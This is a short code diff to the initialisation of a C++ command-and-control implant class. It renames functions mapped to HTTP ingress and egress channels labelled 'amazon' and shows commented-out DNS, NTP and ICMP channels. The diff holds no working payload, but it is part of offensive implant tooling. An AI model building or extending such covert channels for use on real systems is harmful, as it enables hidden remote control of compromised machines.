@@ -46,10 +46,10 @@ void post_ICMP(std::string implant_uuid, std::string text_data, std::string task
 //jinja this
 void C2Implant::init() {
     // Mapping Enums to Functions
-    s_ingress_map["http_get_amazon"] = http_get; //temp hardcode
+    s_ingress_map["http_get_amazon"] = get; //temp hardcode
     //s_ingress_map["dns_get_amazon"] = get_DNS;
 
-    s_egress_map["http_post_amazon"] = http_post; //temp hardcode
+    s_egress_map["http_post_amazon"] = post; //temp hardcode
 
     //s_egress_map["ntp_post_profile1"] = post_NTP;
     //s_egress_map["icmp_post_profile1"] = post_ICMP;
